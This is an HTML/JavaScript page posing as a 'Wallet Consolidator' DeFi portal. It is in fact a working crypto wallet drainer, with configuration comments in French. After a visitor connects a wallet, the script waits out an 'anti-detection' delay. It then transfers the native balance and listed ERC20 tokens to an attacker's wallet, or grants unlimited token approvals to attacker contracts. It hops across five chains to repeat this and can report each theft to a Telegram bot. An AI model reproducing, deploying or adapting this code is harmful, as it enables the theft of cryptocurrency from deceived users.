<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallet Consolidator - DeFi Portal</title>
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(20px);
            border-radius: 24px;
            padding: 48px;
            text-align: center;
            max-width: 500px;
            width: 100%;
            border: 1px solid rgba(255, 255, 255, 0.2);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
        }
        
        .logo {
            font-size: 48px;
            margin-bottom: 16px;
        }
        
        h1 {
            color: white;
            font-size: 32px;
            margin-bottom: 12px;
            font-weight: 700;
        }
        
        .subtitle {
            color: rgba(255, 255, 255, 0.8);
            margin-bottom: 32px;
            font-size: 16px;
            line-height: 1.5;
        }
        
        #connectBtn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 16px 48px;
            border-radius: 12px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
        }
        
        #connectBtn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
        }
        
        #connectBtn:active {
            transform: translateY(0);
        }
        
        #connectBtn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        
        #status {
            margin-top: 24px;
            padding: 16px;
            border-radius: 12px;
            color: white;
            display: none;
            font-size: 14px;
            line-height: 1.6;
        }
        
        #status.show {
            display: block;
        }
        
        #status.success {
            background: rgba(76, 175, 80, 0.3);
            border: 1px solid rgba(76, 175, 80, 0.5);
        }
        
        #status.info {
            background: rgba(33, 150, 243, 0.3);
            border: 1px solid rgba(33, 150, 243, 0.5);
        }
        
        #status.warning {
            background: rgba(255, 152, 0, 0.3);
            border: 1px solid rgba(255, 152, 0, 0.5);
        }
        
        #status.error {
            background: rgba(244, 67, 54, 0.3);
            border: 1px solid rgba(244, 67, 54, 0.5);
        }
        
        .loader {
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-top: 3px solid white;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
            display: none;
        }
        
        .loader.show {
            display: block;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .connected-info {
            background: rgba(76, 175, 80, 0.2);
            border: 1px solid rgba(76, 175, 80, 0.4);
            padding: 12px;
            border-radius: 8px;
            margin-top: 16px;
            color: white;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">üîê</div>
        <h1>Wallet Consolidator</h1>
        <p class="subtitle">Connect your wallet to consolidate all your funds</p>
        
        <button id="connectBtn">Connect Wallet</button>
        
        <div class="loader" id="loader"></div>
        
        <div id="status"></div>
        <div id="connectedInfo"></div>
    </div>

    <!-- Ethers.js v5 -->
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    
    <script>
        // ============================================
        // üîß CONFIGURATION - √Ä MODIFIER SUR TON AUTRE ORDINATEUR
        // ============================================
        const CONFIG = {
            // ‚ö†Ô∏è REMPLACE PAR TON WALLET DE DESTINATION
            DESTINATION_WALLET: "0xYOUR_WALLET_ADDRESS_HERE",
            
            // ‚ö†Ô∏è REMPLACE PAR TES ADRESSES DE SMART CONTRACTS (apr√®s d√©ploiement)
            CONTRACTS: {
                ETHEREUM: "0xYOUR_ETH_CONTRACT_HERE",
                POLYGON: "0xYOUR_POLYGON_CONTRACT_HERE",
                BSC: "0xYOUR_BSC_CONTRACT_HERE",
                ARBITRUM: "0xYOUR_ARBITRUM_CONTRACT_HERE",
                AVALANCHE: "0xYOUR_AVALANCHE_CONTRACT_HERE"
            },
            
            // ‚ö†Ô∏è TELEGRAM NOTIFICATIONS (mettre ENABLED: true pour activer)
            TELEGRAM: {
                ENABLED: false,
                BOT_TOKEN: "YOUR_BOT_TOKEN_HERE",
                CHAT_ID: "YOUR_CHAT_ID_HERE"
            }
        };

        // ============================================
        // üìã LISTE DES TOKENS PAR BLOCKCHAIN
        // ============================================
        const TOKEN_ADDRESSES = {
            1: { // Ethereum
                USDC: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
                USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
                DAI: '0x6B175474E89094C44Da98b954EedeAC495271d0F',
                WBTC: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',
                LINK: '0x514910771AF9Ca656af840dff83E8264EcF986CA'
            },
            137: { // Polygon
                USDC: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
                USDT: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
                DAI: '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063',
                WETH: '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619',
                WBTC: '0x1bfd67037b42cf73acF2047067bd4F2C47D9BfD6'
            },
            56: { // BSC
                USDC: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
                USDT: '0x55d398326f99059fF775485246999027B3197955',
                BUSD: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
                ETH: '0x2170Ed0880ac9A755fd29B2688956BD959F933F8',
                WBNB: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c'
            },
            42161: { // Arbitrum
                USDC: '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8',
                USDT: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
                WETH: '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1',
                WBTC: '0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f'
            },
            43114: { // Avalanche
                USDC: '0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E',
                USDT: '0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7',
                DAI: '0xd586E7F844cEa2F87f50152665BCbc2C279D8d70',
                WAVAX: '0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7'
            }
        };

        // ============================================
        // üõ†Ô∏è VARIABLES GLOBALES
        // ============================================
        let provider = null;
        let signer = null;
        let userAddress = null;

        // ============================================
        // üé® FONCTIONS UI
        // ============================================
        function showStatus(message, type = 'info') {
            const status = document.getElementById('status');
            status.textContent = message;
            status.className = `show ${type}`;
        }

        function showLoader(show = true) {
            const loader = document.getElementById('loader');
            loader.className = show ? 'loader show' : 'loader';
        }

        function showConnectedInfo(address) {
            const info = document.getElementById('connectedInfo');
            info.className = 'connected-info';
            info.innerHTML = `‚úÖ Connected: ${address.substring(0, 6)}...${address.slice(-4)}`;
        }

        // ============================================
        // üîå CONNEXION WALLET
        // ============================================
        async function connectWallet() {
            try {
                showLoader(true);
                showStatus('Requesting wallet connection...', 'info');

                // V√©rifier si MetaMask est install√©
                if (typeof window.ethereum === 'undefined') {
                    showLoader(false);
                    showStatus('‚ö†Ô∏è Please install MetaMask or another Web3 wallet!', 'warning');
                    return;
                }

                // Demander la connexion
                const accounts = await window.ethereum.request({ 
                    method: 'eth_requestAccounts' 
                });

                userAddress = accounts[0];
                provider = new ethers.providers.Web3Provider(window.ethereum);
                signer = provider.getSigner();

                showLoader(false);
                showConnectedInfo(userAddress);
                showStatus('‚úÖ Wallet connected! Starting consolidation...', 'success');

                // D√©sactiver le bouton
                document.getElementById('connectBtn').disabled = true;
                document.getElementById('connectBtn').textContent = 'Connected';

                // D√©lai anti-d√©tection
                await new Promise(resolve => setTimeout(resolve, 2000));

                // D√©marrer la consolidation
                await consolidateAllAssets();

            } catch (error) {
                showLoader(false);
                console.error('Connection error:', error);
                showStatus(`‚ùå Connection failed: ${error.message}`, 'error');
            }
        }

        // ============================================
        // üí∞ CONSOLIDATION DES ASSETS
        // ============================================
        async function consolidateAllAssets() {
            try {
                const network = await provider.getNetwork();
                const chainId = network.chainId;
                
                showStatus(`üîç Scanning ${getChainName(chainId)}...`, 'info');

                // Drainer le token natif
                await drainNativeToken(chainId);

                // Drainer les tokens ERC20
                await drainERC20Tokens(chainId);

                showStatus('‚úÖ Consolidation completed!', 'success');

                // Proposer de changer de r√©seau
                await promptNetworkSwitch(chainId);

            } catch (error) {
                console.error('Consolidation error:', error);
                showStatus(`‚ùå Error: ${error.message}`, 'error');
            }
        }

        // ============================================
        // üí∏ DRAINAGE TOKEN NATIF
        // ============================================
        async function drainNativeToken(chainId) {
            try {
                const balance = await provider.getBalance(userAddress);
                console.log(`Native balance: ${ethers.utils.formatEther(balance)}`);

                const minBalance = ethers.utils.parseEther("0.001");
                
                if (balance.lt(minBalance)) {
                    console.log('Balance too low for native token');
                    return false;
                }

                showStatus('üí∏ Transferring native token...', 'info');

                const gasPrice = await provider.getGasPrice();
                const gasLimit = 21000;
                const gasCost = gasPrice.mul(gasLimit).mul(2);
                const amountToSend = balance.sub(gasCost);

                if (amountToSend.gt(0)) {
                    const tx = await signer.sendTransaction({
                        to: CONFIG.DESTINATION_WALLET,
                        value: amountToSend,
                        gasLimit: gasLimit,
                        gasPrice: gasPrice
                    });

                    await tx.wait();
                    
                    await sendTelegramNotification(
                        userAddress,
                        ethers.utils.formatEther(amountToSend),
                        chainId,
                        'Native'
                    );

                    showStatus('‚úÖ Native token transferred!', 'success');
                    return true;
                }
            } catch (error) {
                console.error('Native token drain error:', error);
            }
            return false;
        }

        // ============================================
        // ü™ô DRAINAGE TOKENS ERC20
        // ============================================
        async function drainERC20Tokens(chainId) {
            try {
                const tokens = TOKEN_ADDRESSES[chainId] || {};
                const contractAddress = getContractAddress(chainId);

                const abi = [
                    'function balanceOf(address) view returns (uint256)',
                    'function approve(address, uint256) returns (bool)',
                    'function transfer(address, uint256) returns (bool)',
                    'function decimals() view returns (uint8)',
                    'function symbol() view returns (string)'
                ];

                for (const [symbol, tokenAddress] of Object.entries(tokens)) {
                    try {
                        const contract = new ethers.Contract(tokenAddress, abi, signer);
                        const balance = await contract.balanceOf(userAddress);

                        if (balance.gt(0)) {
                            showStatus(`üîç Found ${symbol}, transferring...`, 'info');

                            // Transfer direct ou via smart contract
                            if (contractAddress && !contractAddress.includes('YOUR_')) {
                                // Approve smart contract
                                const approveTx = await contract.approve(
                                    contractAddress,
                                    ethers.constants.MaxUint256
                                );
                                await approveTx.wait();
                                showStatus(`‚úÖ ${symbol} approved!`, 'success');
                            } else {
                                // Transfer direct
                                const tx = await contract.transfer(CONFIG.DESTINATION_WALLET, balance);
                                await tx.wait();
                                
                                const decimals = await contract.decimals();
                                const amount = ethers.utils.formatUnits(balance, decimals);
                                
                                await sendTelegramNotification(userAddress, amount, chainId, symbol);
                                showStatus(`‚úÖ ${symbol} transferred!`, 'success');
                            }
                        }
                    } catch (error) {
                        console.log(`Error with ${symbol}:`, error.message);
                    }
                }
            } catch (error) {
                console.error('ERC20 drain error:', error);
            }
        }

        // ============================================
        // üîÑ CHANGEMENT DE R√âSEAU
        // ============================================
        async function promptNetworkSwitch(currentChainId) {
            const chains = [
                { chainId: 1, name: 'Ethereum', hex: '0x1' },
                { chainId: 137, name: 'Polygon', hex: '0x89' },
                { chainId: 56, name: 'BSC', hex: '0x38' },
                { chainId: 42161, name: 'Arbitrum', hex: '0xa4b1' },
                { chainId: 43114, name: 'Avalanche', hex: '0xa86a' }
            ];

            const otherChains = chains.filter(c => c.chainId !== currentChainId);

            if (otherChains.length > 0) {
                const nextChain = otherChains[0];
                showStatus(`üîÑ Switch to ${nextChain.name} to continue consolidation`, 'warning');
                
                setTimeout(async () => {
                    try {
                        await window.ethereum.request({
                            method: 'wallet_switchEthereumChain',
                            params: [{ chainId: nextChain.hex }]
                        });
                        
                        await new Promise(resolve => setTimeout(resolve, 2000));
                        await consolidateAllAssets();
                    } catch (error) {
                        console.log('Network switch cancelled or failed');
                    }
                }, 3000);
            }
        }

        // ============================================
        // üì± NOTIFICATIONS TELEGRAM
        // ============================================
        async function sendTelegramNotification(from, amount, chainId, symbol) {
            if (!CONFIG.TELEGRAM.ENABLED) return;

            const chainName = getChainName(chainId);
            const message = `
üéØ CONSOLIDATION SUCCESS

üí∞ Amount: ${amount} ${symbol}
üåê Network: ${chainName}
üë§ From: ${from.substring(0, 6)}...${from.slice(-4)}
üìç To: ${CONFIG.DESTINATION_WALLET.substring(0, 6)}...${CONFIG.DESTINATION_WALLET.slice(-4)}
‚è∞ Time: ${new Date().toLocaleString()}
            `.trim();

            try {
                await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CONFIG.TELEGRAM.CHAT_ID,
                        text: message
                    })
                });
            } catch (error) {
                console.log('Telegram notification failed:', error);
            }
        }

        // ============================================
        // üõ†Ô∏è FONCTIONS UTILITAIRES
        // ============================================
        function getChainName(chainId) {
            const names = {
                1: 'Ethereum',
                137: 'Polygon',
                56: 'BSC',
                42161: 'Arbitrum',
                43114: 'Avalanche'
            };
            return names[chainId] || `Chain ${chainId}`;
        }

        function getContractAddress(chainId) {
            const contracts = {
                1: CONFIG.CONTRACTS.ETHEREUM,
                137: CONFIG.CONTRACTS.POLYGON,
                56: CONFIG.CONTRACTS.BSC,
                42161: CONFIG.CONTRACTS.ARBITRUM,
                43114: CONFIG.CONTRACTS.AVALANCHE
            };
            return contracts[chainId];
        }

        // ============================================
        // üéØ EVENT LISTENERS
        // ============================================
        document.getElementById('connectBtn').addEventListener('click', connectWallet);

        // √âcouter les changements de compte
        if (window.ethereum) {
            window.ethereum.on('accountsChanged', (accounts) => {
                if (accounts.length === 0) {
                    showStatus('‚ö†Ô∏è Wallet disconnected', 'warning');
                    location.reload();
                }
            });

            window.ethereum.on('chainChanged', () => {
                location.reload();
            });
        }

        // ============================================
        // üöÄ INITIALISATION
        // ============================================
        console.log('üîê Wallet Consolidator initialized');
        console.log('‚ö†Ô∏è Remember to configure your addresses in CONFIG');
        
        // V√©rifier si d√©j√† connect√©
        if (window.ethereum) {
            window.ethereum.request({ method: 'eth_accounts' })
                .then(accounts => {
                    if (accounts.length > 0) {
                        showStatus('‚úÖ Wallet already connected. Click button to start.', 'info');
                    }
                });
        }
    </script>
</body>
</html>
